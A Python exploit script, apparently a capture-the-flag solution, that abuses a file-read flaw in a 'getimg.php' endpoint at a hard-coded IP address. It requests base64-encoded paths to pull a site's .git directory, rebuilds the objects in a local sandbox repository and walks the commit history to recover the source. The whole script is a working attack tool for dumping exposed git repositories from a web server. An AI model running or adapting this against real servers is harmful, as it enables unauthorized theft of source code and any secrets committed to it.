#!/usr/bin/env python3

import base64
import os
import re
import subprocess

import requests

URL = 'http://3.91.17.218/getimg.php'
SANDBOX_DIR = os.path.join(os.getcwd(), 'git-sandbox')


def run(cmd):
    return subprocess.check_output(cmd, shell=True).decode()


def read_file(fname):
    enc_fname = base64.b64encode(fname.encode()).decode()

    r = requests.get(f'{URL}?img={enc_fname}')
    return r.content


def read_object(git_hash):
    """Reads git object into the sandbox git repo."""
    h1, h2 = git_hash[:2], git_hash[2:]
    fname = f'.git/objects/{h1}/{h2}'
    contents = read_file(fname)

    run(f'mkdir -p {SANDBOX_DIR}/.git/objects/{h1}')
    with open(f'{SANDBOX_DIR}/{fname}', 'wb') as f:
        f.write(contents)


def git_cat_file(git_hash):
    return run(f'cd {SANDBOX_DIR} && git cat-file -p {git_hash}')


def get_commit_peer_hashes(commit_hash):
    """Return a tree, parent tuple of git hashes."""
    commit_contents = git_cat_file(commit_hash)
    lines = commit_contents.splitlines()

    tree_line = lines[0].strip()
    parent_line = lines[1].strip()

    return tree_line.split()[1], parent_line.split()[1]


def get_file_hashes(tree_hash):
    """Get file hashes from a tree's git-cat output."""
    blob_lines = [
        line.strip() for line in git_cat_file(tree_hash).splitlines()
        if 'blob' in line
    ]

    hashes = [line.split()[2] for line in blob_lines]
    return hashes


def fresh_sandbox():
    run(f'rm -rf {SANDBOX_DIR}')
    run(f'mkdir {SANDBOX_DIR}')
    run(f'cd {SANDBOX_DIR} && git init')


if __name__ == '__main__':
    fresh_sandbox()
    master_commit = read_file('.git/refs/heads/master').decode().strip()
    read_object(master_commit)

    tree, parent = get_commit_peer_hashes(master_commit)
    while True:
        read_object(tree)
        read_object(parent)

        print(git_cat_file(parent))
        print(git_cat_file(tree))

        tree, parent = get_commit_peer_hashes(parent)
